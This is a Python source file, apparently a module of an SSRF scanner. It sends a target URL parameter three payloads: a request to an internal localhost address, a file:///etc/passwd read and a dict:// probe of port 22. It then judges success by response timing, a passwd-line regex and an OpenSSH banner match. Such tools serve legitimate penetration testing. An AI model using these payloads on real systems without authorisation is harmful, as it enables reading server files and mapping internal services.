#encoding : utf-8

import re

from lib.config import *
from lib.common import *


#Testabilit check
def test_check(target,parameter):

    protocol = []
    lowerstdlimit = check_time_limit(target)


    payload_http_inner = "{url}?{query}=http://127.0.0.1".format(url=target,query=parameter)
    payload_file = "{url}?{query}=file:///etc/passwd".format(url=target,query=parameter)
    payload_dict = "{url}?{query}=dict://127.0.0.1:22".format(url=target,query=parameter)


    if check_time_content(payload_http_inner,lowerstdlimit):
        dump_console(host=target, parameter=parameter, payload=payload_http_inner, protocol='http')

        #print("time {0}".format(payload_http_inner))

    if check_content(payload_file):
        dump_console(host=target, parameter=parameter, payload=payload_file, protocol='file')

        #print("file {0}".format(payload_file))

    if check_fingerprint(payload_dict):
        dump_console(host=target, parameter=parameter, payload=payload_dict, protocol='dict')

        #print("ssh {0}".format(payload_dict))

    else:
        return False

#Judging by time difference and content difference target_url with payload
def check_time_content(payload,lowerstdlimit):
    try:
        requests_time= get_requests(payload)
        response_time_check = float(requests_time.elapsed.microseconds)

        if (response_time_check >= lowerstdlimit) and (len(requests_time.content) != 0):
            return True
        else:
            return False
    except:
        return False

#Judging by reponse content
def check_content(payload,timeout=10):
    try:
        requests_content = get_requests(payload).text
        regex_file = re.compile(r'((\w)+:x:(\d)+:(\d)+:(\w)+)')
        if regex_file.match(requests_content):
            return True
        else:
            return False
    except:
        return False

#Judging by server fingerprint
def check_fingerprint(payload):
    try:
        requests_fingerprint = get_requests(payload).text
        regex_ssh = re.compile(r'(OpenSSH)')
        if regex_ssh.search(requests_fingerprint):
            return True
        else:
            return False
    except:
        return False

